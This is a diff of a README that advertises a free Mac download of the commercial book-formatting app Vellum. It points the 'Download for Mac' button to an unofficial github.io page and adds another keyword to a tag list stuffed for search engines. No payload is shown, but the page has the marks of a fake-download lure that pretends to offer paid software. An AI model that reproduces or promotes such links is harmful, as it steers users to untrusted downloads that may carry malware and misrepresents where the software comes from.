@@ -4,7 +4,7 @@
 
 ![vellum](https://selfpublishingadvice.org/wp-content/uploads/2017/02/01-Vellum.png)
  
->[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-Vellum-blue?logo=apple&style=for-the-badge)](#)
+>[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-Vellum-blue?logo=apple&style=for-the-badge)](https://vellum-for-mac.github.io/.github/)
 
 >If the button doesn’t work, please follow the instructions below.
 
@@ -71,4 +71,4 @@ Because it’s elegant, fast, and made with authors in mind. It streamlines the 
 
 ## 🔍 Tags
 
-vellum, vellum pub, vellum book, vellum download, vellum books, vellum mac download, vellum free for mac, vellum publishing software macos, vellum formatting tool, Vellum software, Vellum book formatting, Vellum for Mac, Vellum book creation tool, Vellum publishing software, Vellum for self-publishing, book formatting software for Mac, best software for ebook formatting, software for creating ebooks, professional book formatting tool
+vellum, vellum mac, vellum pub, vellum book, vellum download, vellum books, vellum mac download, vellum free for mac, vellum publishing software macos, vellum formatting tool, Vellum software, Vellum book formatting, Vellum for Mac, Vellum book creation tool, Vellum publishing software, Vellum for self-publishing, book formatting software for Mac, best software for ebook formatting, software for creating ebooks, professional book formatting tool
